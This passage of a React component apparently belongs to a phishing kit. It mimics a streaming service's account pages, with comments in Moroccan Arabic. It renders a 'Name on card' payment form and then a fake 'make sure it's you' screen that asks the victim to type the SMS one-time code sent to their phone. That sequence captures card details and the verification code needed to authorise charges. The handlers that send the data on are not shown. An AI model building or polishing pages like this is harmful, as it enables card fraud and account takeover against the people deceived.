                        className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${cardErrors.nameOnCard ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-blue-500 peer appearance-none`} 
                        placeholder=" " 
                      />
                      <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Name on card</label>
                    </div>
                    {cardErrors.nameOnCard && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{cardErrors.nameOnCard}</div>}
                  </div>
                  
                  <button onClick={handleCardSubmit} disabled={isLoading} className="bg-[#e50914] text-white w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-red-700 transition mt-6 disabled:opacity-70">
                    {isLoading ? 'Processing...' : 'Next'}
                  </button>

                  <p className="text-[13px] text-[#737373] mt-8 text-center px-4">
                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
                  </p>
                </div>
              </div>
            )}

        {/* ======================= Step 6: SMS Trigger ======================= */}
        {/* ======================= Step 6: SMS Trigger ======================= */}
        {step === 6 && (
          <div className="flex flex-col items-start mt-16 max-w-[500px] mx-auto px-4">
            <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-2 text-[#333]">First, let's make sure it's you</h1>
            <p className="text-[16px] mb-8 text-[#333]">Before we make any changes, we'll just need a quick confirmation.</p>
            
            <button onClick={() => goToStep(7)} className="flex items-center justify-between w-full p-4 bg-[#f3f3f3] rounded-[5px] hover:bg-[#e5e5e5] transition min-h-[70px]">
              <div className="flex items-center gap-4">
                {/* أيقونة الميساج */}
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" className="text-[#333] flex-shrink-0">
                  <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                  <line x1="9" y1="10" x2="9.01" y2="10"></line>
                  <line x1="12" y1="10" x2="12.01" y2="10"></line>
                  <line x1="15" y1="10" x2="15.01" y2="10"></line>
                </svg>
                
                <div className="flex flex-col items-start">
                  <span className="text-[16px] text-[#333] font-bold">Text a code</span>
                  <span className="text-[14px] text-[#737373] mt-0.5">{phone_number || '0645-924411'}</span>
                </div>
              </div>

              {/* أيقونة السهم */}
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M9 18l6-6-6-6"></path>
              </svg>
            </button>
          </div>
        )}

{/* ======================= Step 7: Enter SMS Code ======================= */}
        {step === 7 && (
          <div className="flex flex-col items-start mt-12 max-w-[500px] mx-auto px-4 relative">
            
            {/* ⚠️ المربع ديال الإيرور (كيبان غير يلا كانت error) */}
            {smsError && (
              <div className="w-full bg-[#fdeecb] p-4 rounded-[3px] mb-6 flex items-start gap-3">
                <svg className="w-6 h-6 text-black flex-shrink-0" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21H23L12 2ZM12 6.09L18.46 17H5.54L12 6.09ZM11 10V14H13V10H11ZM11 15V17H13V15H11Z"></path>
                </svg>
                <span className="text-[16px] text-black font-medium">{smsError}</span>
              </div>
            )}

            <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-[#333]">Please enter the code we just sent</h1>
            <p className="text-[16px] mb-8 text-[#333]">
              Please enter the code we sent to <b>{phone_number}</b> to help us protect your account. The code will expire 10 minutes after it's sent.
            </p>
            
            {/* inputs ديال الكود */}
            <div className="flex justify-start gap-2 mb-8">
              {smsCode.map((digit, index) => (
                <input
                  key={index} id={`sms-${index}`} type="text" maxLength="1" value={digit}
                  onChange={(e) => {
                    handleSmsChange(e, index);
                    if (smsError) setSmsError(''); // فاش كيبدا يكتب كنحيدو الإيرور
                  }} 
                  onKeyDown={(e) => handleSmsKeyDown(e, index)}
                  className={`w-[45px] h-[55px] border ${smsError ? 'border-red-500' : 'border-gray-400'} rounded-[3px] text-center text-[20px] font-bold focus:outline-none focus:border-black focus:ring-1 focus:ring-black transition`}
                />
              ))}
            </div>

            <button onClick={handleSmsSubmit} disabled={isLoading} className="bg-black text-white w-full h-[50px] rounded-[3px] font-bold text-[16px] hover:bg-gray-800 transition mb-3 disabled:opacity-70">
              {isLoading ? 'Checking...' : 'Submit'}
            </button>
            <button onClick={handleResend} className="bg-[#e6e6e6] text-black w-full h-[50px] rounded-[3px] font-bold text-[16px] hover:bg-gray-300 transition mb-6">
              Resend code
            </button>
            <button className="text-[#333] font-bold text-[16px] hover:underline mx-auto block mb-8">Try another way</button>

            {/* 🔔 الـ Notification الكحلة لتحت */}
            {showResendToast && (
              <div className="fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-[#181818] text-white px-6 py-3 rounded-full flex items-center gap-3 shadow-2xl z-50 animate-fade-in-up">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="text-white">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span className="font-bold text-[16px]">Code resent.</span>
                <button onClick={() => setShowResendToast(false)} className="ml-4 text-gray-400 hover:text-white transition">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                  </svg>
                </button>
              </div>
            )}
            
          </div>
        )}
      </main>
    </div>
  );
};

export default Account;